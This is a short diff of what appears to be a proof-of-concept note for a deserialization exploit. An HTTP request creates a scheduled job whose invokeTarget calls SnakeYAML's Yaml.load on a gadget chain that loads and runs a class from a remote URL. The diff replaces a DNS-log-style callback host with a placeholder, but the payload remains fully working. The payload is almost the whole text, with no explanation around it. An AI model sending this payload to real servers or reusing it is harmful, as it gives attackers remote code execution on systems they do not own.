@@ -39,7 +39,7 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/json;charset=utf-8
 
-{"jobName":"123","jobGroup":"DEFAULT","invokeTarget":"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://fwgl.ahjkjt.com.6541b.11e4.bnslog.top\"]]]]')","cronExpression":"0/20 * * * * ?","misfirePolicy":1,"concurrent":"0","status":"0"}
+{"jobName":"123","jobGroup":"DEFAULT","invokeTarget":"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://host/\"]]]]')","cronExpression":"0/20 * * * * ?","misfirePolicy":1,"concurrent":"0","status":"0"}
 ```
 
 ### list
